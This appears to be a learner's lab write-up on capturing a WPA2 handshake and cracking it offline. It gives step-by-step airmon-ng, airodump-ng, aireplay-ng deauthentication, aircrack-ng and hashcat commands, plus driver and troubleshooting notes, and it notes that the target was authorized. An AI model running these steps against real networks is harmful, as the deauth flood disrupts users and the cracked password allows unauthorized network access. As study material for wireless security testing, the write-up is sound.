## Wireless Cracking (WPA2)

Attacking a WiFi access point to capture the WPA2 handshake — which contains the password in hashed form — then crack it offline using a wordlist.

**Important:** Only perform on networks you own or have explicit permission to test.

---

### Requirements

- WiFi adapter supporting **monitor mode** and **packet injection**
- My adapter: **TP-Link WN722N v2** (Realtek RTL8188EUS chip)
  - Built-in `rtl8xxxu` driver is unstable for monitor mode
  - Fixed by installing proper `rtl8188eus` driver from GitHub
- Target: Mobile hotspot (authorized)

---

### Attack Flow

```
Enable monitor mode
→ Scan for access points (find BSSID + channel)
→ Send deauthentication packets (force client disconnect)
→ Client reconnects → 4-way handshake captured
→ Crack handshake offline with wordlist
```

**Why deauth works:** WPA2 requires a 4-way handshake every time a client connects. By forcing a disconnect, we trigger a fresh handshake we can capture passively.

### Method 1 — Wifite (Automated)

```bash
sudo wifite
```

- Automatically enables monitor mode
- Scans all nearby APs
- Select target → attacks automatically
- Captures handshake and attempts crack without manual steps

---

### Method 2 — Manual (Aircrack-ng Suite)

**Step 1 — Kill interfering processes:**
```bash
sudo airmon-ng check kill
```

**Step 2 — Enable monitor mode:**
```bash
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
```

Note: Interface may rename to `wlan0mon` after enabling monitor mode.

**Step 3 — Scan for access points:**
```bash
sudo airodump-ng wlan0
```
Note the target's **BSSID** (MAC address) and **channel**.

**Step 4 — Capture on specific target:**
```bash
sudo airodump-ng -c 13 --bssid 5L:93:J3:40:60:F0 -w capture wlan0
```
- `-c` — channel
- `--bssid` — target MAC address
- `-w capture` — save to `capture.cap`

**Step 5 — Deauthentication attack:**
```bash
sudo aireplay-ng -0 0 -a 5L:93:J3:40:60:F0 wlan0
```
- `-0` — deauth attack mode
- `0` — infinite packets (use `10` for 10 packets)
- `-a` — target BSSID

Wait for `WPA handshake` to appear in airodump-ng output.

### Password Cracking

**Aircrack-ng (CPU):**
```bash
sudo aircrack-ng capture.cap -w /usr/share/wordlists/rockyou.txt
```
Slower — CPU only. rockyou.txt contains ~14 million passwords.

**Hashcat (CPU + GPU):**

Convert `.cap` to hashcat format first, then:
```bash
hashcat -a 0 -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt
```
- `-a 0` — dictionary attack
- `-m 22000` — WPA-PBKDF2-PMKID+EAPOL (WPA2 hash mode)
- Significantly faster than aircrack-ng due to GPU support

---

### Aircrack vs Hashcat

| | Aircrack-ng | Hashcat |
|--|--|--|
| Uses | CPU only | CPU + GPU |
| Speed | Slow | Much faster |
| Input format | `.cap` | `.hc22000` |
| Best for | Quick tests | Large wordlists |

---

### Key Learnings

- WPA2 handshake contains password in hashed form — never plaintext
- Deauthentication forces reconnect, triggering a fresh handshake
- WiFi 6 (802.11ax) and WPA3 resist deauth attacks — older devices are easier targets
- `rtl8xxxu` driver is unstable — install proper `rtl8188eus` driver for TP-Link WN722N v2
- rockyou.txt is a common starting point but won't crack strong unique passwords
- Hashcat is significantly faster than aircrack-ng due to GPU support

---

### Troubleshooting

| Problem | Fix |
|---------|-----|
| No targets found | Driver issue — install proper Realtek driver |
| Deauth not working | Target may have Management Frame Protection (MFP) enabled |
| Handshake not captured | Client already connected — force reconnect |
| Hashcat memory error | Allocate more RAM to VM |
| Interface disappears | Renamed to `wlan0mon` after monitor mode — use new name |
